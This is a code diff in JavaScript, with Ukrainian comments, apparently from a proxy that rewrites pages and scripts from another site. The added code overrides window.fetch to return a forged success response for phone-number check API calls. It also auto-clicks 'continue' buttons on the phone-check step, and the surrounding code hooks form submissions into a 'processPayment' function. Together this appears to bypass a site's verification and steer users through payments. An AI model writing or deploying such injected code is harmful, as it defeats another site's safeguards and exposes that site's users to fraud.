@@ -116,6 +116,24 @@ async function modifyHTML(response) {
         }
       });
       
+      // Автоматичне проходження етапу перевірки номера
+      function autoProgressAfterCheckNumber() {
+        // Імітуємо кліки на кнопки "Далі" або "Продовжити" після завантаження сторінки
+        setTimeout(() => {
+          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
+            const text = el.innerText || el.value || '';
+            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
+                   el.classList.contains('btn-primary') || 
+                   el.classList.contains('btn-success');
+          });
+          
+          if (continueButtons.length > 0) {
+            console.log('Auto-continuing to next step');
+            continueButtons[0].click();
+          }
+        }, 500);
+      }
+
       window.processPayment = async function(amount, phoneNumber, sourceEvent) {
         if (sourceEvent) {
           sourceEvent.preventDefault();
@@ -188,6 +206,11 @@ async function modifyHTML(response) {
       };
       
       document.addEventListener('DOMContentLoaded', function() {
+        // Автоматичний перехід до наступного етапу, якщо поточний URL містить "check_number"
+        if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
+          autoProgressAfterCheckNumber();
+        }
+        
         document.querySelectorAll('form').forEach(form => {
           form.addEventListener('submit', function(event) {
             const amount = form.querySelector('[data-amount]')?.getAttribute('data-amount') || '5';
@@ -264,22 +287,49 @@ async function modifyJavaScript(response) {
     (function() {
       const origFetch = window.fetch;
       window.fetch = function(url, options) {
-        if (url && typeof url === 'string' && url.includes('/api/check_number')) {
-          return Promise.resolve(new Response(JSON.stringify({
-            code: 200,
-            data: {
-              id: Math.floor(Math.random() * 90000000) + 10000000,
-              charges: 0,
-              country: "spania",
-              number: ""
-            }
-          }), { 
-            status: 200, 
-            headers: { 'Content-Type': 'application/json' } 
-          }));
+        if (url && typeof url === 'string') {
+          // Автоматична відповідь для перевірки номера
+          if (url.includes('/api/check_number') || url.includes('/api/check-number')) {
+            return Promise.resolve(new Response(JSON.stringify({
+              code: 200,
+              data: {
+                id: Math.floor(Math.random() * 90000000) + 10000000,
+                charges: 0,
+                country: "spania",
+                number: ""
+              }
+            }), { 
+              status: 200, 
+              headers: { 'Content-Type': 'application/json' } 
+            }));
+          }
+          
+          // Для інших API запитів, які потрібно обробити автоматично
+          if (url.includes('/api/')) {
+            console.log('Intercepted API request:', url);
+          }
         }
         return origFetch.call(this, url, options);
       };
+    })();
+    
+    // Автоматичний перехід до наступного кроку після перевірки номера
+    (function() {
+      if (window.location.href.includes('check_number') || window.location.pathname.includes('/phone')) {
+        setTimeout(() => {
+          const continueButtons = Array.from(document.querySelectorAll('button, a.btn, input[type="submit"]')).filter(el => {
+            const text = el.innerText || el.value || '';
+            return text.match(/continue|next|далі|продовжити|siguiente/i) || 
+                  el.classList.contains('btn-primary') || 
+                  el.classList.contains('btn-success');
+          });
+          
+          if (continueButtons.length > 0) {
+            console.log('Auto-continuing to next step');
+            continueButtons[0].click();
+          }
+        }, 500);
+      }
     })();
     
     (function() {
